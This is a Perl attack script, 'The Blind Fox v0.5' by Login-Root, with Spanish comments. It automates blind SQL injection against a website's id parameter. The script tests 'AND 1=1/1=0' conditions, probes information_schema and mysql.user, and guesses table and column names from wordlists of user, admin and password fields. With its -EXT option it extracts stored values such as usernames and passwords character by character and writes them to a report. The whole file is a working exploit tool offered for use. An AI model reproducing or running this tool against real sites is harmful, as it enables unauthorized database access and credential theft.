#!/usr/bin/perl

###########################################################################################
#                           -[+]- The Blind Fox v0.5 | By Login-Root -[+]-              ###
###########################################################################################

###########################################################################################
# [+] inf0:                                                                             ###
###########################################################################################
# Busca:                                                                                ###
# ======                                                                                ###
#  - Checkeo AND 1=1 && AND 1=0                                                         ###        
#  - Information_Schema && MySQL.User                                                   ###
#  - Tablas                                                                             ###                                                
#  - Columnas                                                                           ###
#  - Extrae valores de las tablas (Opcional)                                            ###
#                                                                                       ###
#  ...y guarda todo en un archivo de texto.                                             ###
#                                                                                       ###
###########################################################################################

###########################################################################################
# [+] Use:                                                                              ###
###########################################################################################
# perl blindfox.pl [WEBSITE] [PATRON] [FILE] [-EXT]                                     ###
#   [WEBSITE]: http://www.web.com/index.php?id=4875 (Poner un numero valido)            ###
#   [PATRON]:  Patron que exista con AND 1=1 y que no exista con AND 1=0                ###
#   [FILE]:    Archivo donde guardar informe                                            ###
#   [-EXT]:    Para extraer nombres de usuarios, passwords, etc (Opcional)              ###
###########################################################################################

###########################################################################################
# [+] c0ntact:                                                                          ###
###########################################################################################
# MSN:    no.more@passport.com                                                          ###
# Jabber: login-root@x23.eu                                                             ### 
# E-Mail: login_root@yahoo.com.ar                                                       ###
###########################################################################################

###########################################################################################
# [+] sh0utz:                                                                           ###
###########################################################################################
# In memory of ka0x | Greetz: KSHA ; Psiconet ; Knet ; VenoM ; InyeXion                 ###
# Many thanks to boER, who teach me a little of perl ;D                                 ###
# VISIT: WWW.MITM.CL | WWW.REMOTEEXECUTION.ORG | WWW.DIOSDELARED.COM                    ###
###########################################################################################

use LWP::Simple;

if(!$ARGV[2])
	{
		 print "\n\n-[+]- The Blind Fox v0.5 | By Login-Root -[+]-\n==============================================";
		 print "\n\nUso: perl $0 [WEBSITE] [PATRON] [FILE] [-EXT]\n";
		 print "\n[WEBSITE]: http://www.web.com/index.php?id=4875 (Poner un numero valido)\n[PATRON]:  Patron que exista con AND 1=1 y que no exista con AND 1=0\n[FILE]:    Archivo donde guardar informe\n[-EXT]:    Para extraer nombres de usuarios, passwords, etc (Opcional)\n\n";
		 exit (0);
	}
	
sub end()
{
	print WEB "\n\n\n[*EOF*]";
    print "\n\n[+] Todo salvado correctamente en $ARGV[2]\n\n";
    print "## c0ded by Login-Root | 2008 ##\n\n";
    exit (0);  
}    

	
@nombretabla=('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario',
	  'name','names','nombre','nombres','member','members','admin_table',
	  'miembro','miembros','membername','admins','administrator','sign',
	  'administrators','passwd','password','passwords','pass','Pass',
	  'tAdmin','tadmin','user_password','usuarios','user_passwords','user_name','user_names',
	  'member_password','mods','mod','moderators','moderator','user_email',
	  'user_emails','user_mail','user_mails','mail','emails','email','address',
	  'e-mail','emailaddress','correo','correos','phpbb_users','log','logins',
	  'login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass',
	  'tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador',
	  'tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id',
	  'sistema_usuario','sistema_password','contraseña','auth','key','senha','signin',
	  'tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member','club_authors',
      'tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization',
      'membros','utilizadores','staff','nuke_authors','accounts','account','accnts','signup',
      'associated','accnt','customers','customer','membres','administrateur','utilisateur',
      'tuser','tusers','utilisateurs','password','amministratore','god','God','authors','wp_users',
      'asociado','asociados','autores','membername','autor','autores','Users','Admin','Members',
	  'Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');

@nombrecolumna=('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email',
          'user_name','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail',
          'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','login_id','usr','sistema_id','author','user_login',
          'sistema_usuario','auth','key','membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo',
          'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',
          'user_pwd','u_pass','clave','usuario','contraseña','pas','sistema_password','autor','upassword','web_password','web_username');

if ( $ARGV[0]   !~   /^http:/ ) 
  {
      $ARGV[0] = "http://" . $ARGV[0];
  }

open(WEB,">>".$ARGV[2]) || die "\n\n[-] Imposible crear el archivo de texto\n";
print WEB "[WEBSITE]:\n\n$ARGV[0]\n";
print "\n[!] Chequeando por el patron...\n";
      $sql=$ARGV[0]." AND 1=1";
      $response=get($sql);
      if($response =~ /$ARGV[1]/)
        {
            print "\n[+] Patron encontrado con AND 1=1\n";
            print WEB "$sql => OK !\n";
            $sql=$ARGV[0]." AND 1=0";
            $response=get($sql);
            if($response =~ /$ARGV[1]/)
            {
            	print "[-] Patron encontrado tambien con AND 1=0, posiblemente no vulnerable a Blind SQL Inyection, probar con otro patron\n";
            	exit (0);
            }
            else
            {
            	print "[+] Patron no encontrado con AND 1=0, website vulnerable a Blind SQL Inyection\n";
            	print WEB "$sql => OK !\n";
            }
         }
         else
         		{
         			print "[-] Patron no encontrado, probar con otro\n";
         			exit (0);
         		}
        print "\n[!] Chequeando si existe Information_Schema...";
        $sql=$ARGV[0]." AND (SELECT Count(*) FROM information_schema.tables)";
        $response=get($sql);
         if($response =~ /$ARGV[1]/)
         	{
         		print "\n[+] Information_Schema disponible...guardando en $ARGV[2]";
                print WEB "\n\n[INFORMATION_SCHEMA]:\n\n$sql\n";
            	
         	}
         else
         	{
            	print "\n[-] Information_Schema no disponible";
         	}
        print "\n[!] Chequeando si existe MySQL.User...";
        $sql=$ARGV[0]." AND (SELECT Count(*) FROM mysql.user)";
        $response=get($sql);
         if($response =~ /$ARGV[1]/)
         	{
         		print "\n[+] MySQL.User disponible...guardando en $ARGV[2]";
                print WEB "\n\n[MYSQL.USER]:\n\n$sql\n";
            	
         	}
         else
         	{
            	print "\n[-] MySQL.User no disponible";
         	}
        print "\n\n[!] Bruteando tablas...";
        print WEB "\n\n[TABLAS]:\n\n";
        foreach $tabla(@nombretabla)
         {
                  chomp($tabla);
                  $sql=$ARGV[0]." AND (SELECT Count(*) FROM ".$tabla.")";
                  $response=get($sql);
                  if($response =~ /$ARGV[1]/)
                    {
                        print "\n[+] La tabla $tabla esta disponible...guardando en $ARGV[2]";
                        print WEB "$sql\n";
                    }
                }
        print "\n\n[!] Tabla a la cual brutear columnas: ";
            $tabla.=<STDIN>;
            chomp($tabla);
            print WEB "\n\n[COLUMNAS EN $tabla]:\n\n";
            foreach $columna(@nombrecolumna)
            {
             chomp($columna);
             $sql=$ARGV[0]." AND (SELECT Count(".$columna.") FROM ".$tabla.")";
             $response=get($sql);
             if ($response =~ /$ARGV[1]/)
                  {
                      print "[+] La columna $columna esta disponible...guardando en $ARGV[2]\n";
                      print WEB "$sql\n";
                  }
            }
         if ($ARGV[3] =~ /-EXT/)
         {
         	extrac:
         	$columna = '';
         	print "\n[!] Columna de la tabla $tabla a la cual extraer campos: ";
         	$columna.=<STDIN>;
            chomp($columna);
         	print "[!] Extrayendo valores de la tabla $tabla y columna $columna (puede demorar mucho tiempo)...\n\n";
         	print WEB "\n\n[Valores de la tabla $tabla y columna $columna]:\n\n";
         	$search = 1;
         	$posicion = 1;
         	$limit = 0;
         	$comprob = 1;
         	while ($search <= 255)
         	{
         		$sql=$ARGV[0]." AND ascii(substring((SELECT " .$columna. " FROM " .$tabla." limit " .$limit.",1),".$posicion.",1)) = " .$search;
         		$response=get($sql);
         		if ($response =~ /$ARGV[1]/)
                  {
                  	  $char = chr($search);
                  	  print WEB "$char";
                  	  print "$char";
                      $search = 0;
                      $posicion++;
                      $comprob++;
                  }
                 if ($search == 255)
                 {
                 	print "\n";
                 	print WEB "\n";
                 	if ($comprob == 1)
                 	{
                 		$eleccion = '';
                 		print "[+] Busqueda finalizada. Desea extraer valores de otra columna? [Y/N]: ";
                 		$eleccion.=<STDIN>;
                 		chomp($eleccion);
                 		if ($eleccion =~ /Y/)
                 		{
                 			goto extrac;
                 		}
                 		else
                 		{
                 		   end();
                 		}
                 	}
                 	$comprob = 1;
                 	$search = 0;
                    $limit++;
                 }
         		$search++;
            }
           }
end();